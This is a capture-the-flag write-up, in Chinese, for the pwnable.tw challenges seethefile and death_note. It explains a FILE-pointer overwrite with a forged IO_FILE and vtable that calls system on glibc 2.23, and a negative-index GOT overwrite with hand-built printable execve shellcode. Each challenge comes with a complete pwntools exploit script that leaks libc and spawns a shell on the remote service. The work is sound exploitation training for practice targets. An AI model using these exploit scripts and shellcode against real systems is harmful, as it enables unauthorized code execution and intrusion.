## seethefile + death_note Wp

### seethefile

#### 题目分析

题目一共有三个功能，打开文件，读入文件，和打印内容。可以打开一个在当前目录下的文件，但是题目会对文件名称进行过滤，会过滤掉所有名字中存在"flag"字样的文件，之后可以奖文件中的内容读入0x18个字节，并打印，在打印的时候也会过滤掉敏感字样。

在功能结束退出时，可以输入一个字符串，这个字符串又有明显的溢出

```c
printf("Leave your name :");
__isoc99_scanf("%s", name);
printf("Thank you %s ,see you next time\n", name);
if ( fp )
fclose(fp);
 
 
.bss:0804B260 name            db 20h dup(?)           ; DATA XREF: main+9F↑o
.bss:0804B260                                         ; main+B4↑o
.bss:0804B280                 public fp
.bss:0804B280 ; FILE *fp
.bss:0804B280 fp              dd ?                    ; DATA XREF: openfile+6↑r
```

可以覆盖到下面的文件指针。

这样在执行fclose的时候就会使用伪造的FILE指针。

#### 漏洞利用

这道题考察的主要是对于 IO_FILE以及vtable的伪造，在glibc 2.23及以前的libc因为缺少对于IO_FILE中vtable指针的检查，导致可以对vtable进行伪造而劫持程序执行流。

针对于这道题，可以覆盖文件指针到bss段的地址，然后在bss段中伪造一个IO_FILE和vtable，之后在执行flcose函数：

- 首先对IO_FILE中的__flag字段进行 & 0x2000的操作。
- 如果结果为0就会调用，__finish函数。

所以在这道题的最终手段就是伪造vtable中的__finsh函数指针为system函数劫持程序执行流，在这个过程中还要对flgas字段进行伪造，使其满足绕过的要求

#### EXP:

```python
#coding=utf-8
from pwn import *
local = 0
exec_file="./a"
#context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=["/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so",
            "--library-path","/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/","./a"]
if local :
    a=process(argv = argv)
    if context.arch == "i386" :
        libc = ELF("/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so")
        #libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("chall.pwnable.tw",10200)
    libc=ELF("./libc.so.6")
def get_base(a):
    print a.libs()
    text_base = a.libs()[a._cwd+"/a"]
    for key in a.libs():
        if "libc-2.23.so" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x08048A62
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice :",str(idx))
def _open(name):
    menu(1)
    a.sendlineafter("What do you want to see :",name)
    return 

def read():
    menu(2)
    return 
    
def write():
    menu(3)
    return 
    
def close():
    menu(4)
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33
_open("/proc/self/maps")
read()
write()
for i in range(4):
    a.recvline()

libc_base = int(a.recv(8),16) + 0x1000
fuck(libc_base)
close()

#debug()
_open("/proc/self/maps")
fake_IO_file = 0x0804b300
payload = "A" * 0X20 + p32(fake_IO_file) + '\x00' * (0x80 - 4)
#fake start
payload += (p32(0xffffdfff) + ";sh\x00").ljust(0x94,'\x00')
payload += p32(fake_IO_file + 0x98)
payload += p32(libc_base + libc.sym["system"]) * 21
menu(5)
a.sendlineafter("Leave your name :",payload)


a.interactive()

```

### death_note

#### 题目分析

题目是很经典的菜单题，没有开NX所以可以执行shellcode。漏洞也比较容易发现，在对idx进行检查时没有考虑小于零的情况而导致数组idx反向溢出，idx是一个int型变量这里应该检查idx是否小于零。

```c
v1 = read_int();
if ( v1 > 10 )
{
puts("Out of bound !!");
exit(0);
}

......

 *(&note + v1) = strdup(s);
```

#### 漏洞利用

保存note指针的数组在程序的bss段所以通过这个反向溢出可以直接覆盖got表，如果在note中保存商shellcode那么在执行库函数就可以进行执行流的劫持。

但是题目的难点在于，note中只能输入可见的字符，所以要求必须要写一段全部又可见字符构成的且大小小于80个字节的shellcode。

```c
  if ( !is_printable(s) )
  {
    puts("It must be a printable name !");
    exit(-1);
  }
  
  int __cdecl is_printable(char *s)
{
  size_t i; // [esp+Ch] [ebp-Ch]

  for ( i = 0; strlen(s) > i; ++i )
  {
    if ( s[i] <= 0x1F || s[i] == 0x7F )//必须是可见字符
      return 0;
  }
  return 1;
}
```

对于可见shellcode的构造又两种方式：

- 将写好的非可见字符shellcode进行编码为可见字符，在shellcode前加一段解码的指令，控制执行流之后先对shellcode进行解码，之后再执行shellcode，但是这样会导致shellcode过长。
- 还有一种方法就是使用可见指令进行shellcode的编写，只对某些必不可少的指令（int 0x80 , syscall）进行解码。这里的可见指令指的是，在进行汇编之后得到的机器码是可见字符。

因为题目限定了shellcode的长度所以，选用第二种方式。（eax = 0xb, ebx = sh_addr, ecx = 0 ,edx = 0）

```python
shellcode = '''
    /* execve(path='/bin///sh', argv=0, envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx
   /*rewrite shellcode to get 'int 80'*/
    push 0x60606060
    pop edx
    sub byte ptr[eax + 0x32] , dl
    sub byte ptr[eax + 0x32] , dl
    sub byte ptr[eax + 0x31] , dl
    push 0x3e3e3e3e
    pop edx
    sub byte ptr[eax + 0x31] , dl
    /*set zero to edx*/
    and cl, byte ptr[eax + 0x33]
    push ecx
    pop edx
   /*set 0x0b to eax*/
    push edx
    pop eax
    xor al, 0x40
    xor al, 0x4b    
'''
sc = asm(shellcode) + "\x6b\x40\x20"
```

上面是最后写好的shellcode。

在进行解码的时候很重要的是要拿到shellcode的起始地址，其实在进行到shellcode的跳转之前都会将shellcode的起始地址保存在一个寄存器中，仔细观察。这道题之所以选择将覆盖free函数的got就是因为，在free函数执行前将shellcode的起始地址保存到了eax中很方便利用。

#### EXP:

```python
#coding=utf-8
from pwn import *
local = 0
exec_file="./death_note"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
#argv=["/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so",
#           "--library-path","/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/","./death_note"]
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("chall.pwnable.tw",10201)
    #libc=ELF("./libc.so.6")
def get_base(a):
    print a.libs()
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    #text_base = a.libs()[a._cwd + "/death_note"]
    for key in a.libs():
        if "libc-2.31.so" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x080487EF
    b *0x08048873
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice :",str(idx))
def add(idx,name):
    menu(1)
    a.sendlineafter("Index :",str(idx))
    a.sendlineafter("Name :",name)
    return 

def delete(idx):
    menu(3)
    a.sendlineafter("Index :",str(idx))
    return 
    
def edit(idx,content):
    return 
    
def show(idx):
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33 IO_FILE

#debug()

shellcode = '''
    /* execve(path='/bin///sh', argv=0, envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx
   /*rewrite shellcode to get 'int 80'*/
    push 0x60606060
    pop edx
    sub byte ptr[eax + 0x32] , dl
    sub byte ptr[eax + 0x32] , dl
    sub byte ptr[eax + 0x31] , dl
    push 0x3e3e3e3e
    pop edx
    sub byte ptr[eax + 0x31] , dl
    /*set zero to edx*/
    and cl, byte ptr[eax + 0x33]
    push ecx
    pop edx
   /*set 0x0b to eax*/
    push edx
    pop eax
    xor al, 0x40
    xor al, 0x4b    
'''
sc = asm(shellcode) + "\x6b\x40\x20"
for i in range(len(sc) / 4):
    print hex(u32(sc[i*4:(i+1)*4]))
print len(sc)
add(-19,sc)
delete(-19)


a.interactive()

```

